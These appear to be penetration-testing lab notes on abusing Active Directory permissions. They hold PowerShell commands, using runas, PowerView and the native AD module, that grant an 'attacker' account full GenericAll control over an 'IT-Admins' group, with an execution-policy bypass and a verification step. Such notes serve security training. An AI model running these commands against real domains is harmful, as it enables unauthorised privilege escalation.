### Impersonate the user (PowerShell context)
PowerShell itself does **not magically impersonate** unless you **start it with other credentials** or explicitly use credentials.

#### Correct & reliable way (new PowerShell session)
```powershell
runas /netonly /user:<DOMAIN>\<USER> powershell.exe
```
![[Pasted image 20260102085654.png]]
### Using PowerView 
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
```
#### Grant GenericAll on the group
```powershell
Add-DomainObjectAcl `
  -TargetIdentity "IT-Admins" `
  -PrincipalIdentity "attacker" `
  -Rights All
```
---
---

### Using Native AD module


#### Load AD module
```powershell
Import-Module ActiveDirectory
```

#### Get the group DN
```powershell
$group = Get-ADGroup "IT-Admins"
```

#### Build GenericAll ACE
```powershell
$identity = New-Object System.Security.Principal.NTAccount("INLANEFREIGHT\attacker")

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule `
(
  $identity,
  "GenericAll",
  "Allow"
)
```

#### Apply ACL
```powershell
$acl = Get-Acl "AD:$($group.DistinguishedName)"
$acl.AddAccessRule($ace)
Set-Acl "AD:$($group.DistinguishedName)" $acl
```

#### 🔍 Verify
```powershell
(Get-Acl "AD:$($group.DistinguishedName)").Access |
  Where-Object {$_.IdentityReference -match "attacker"}
```
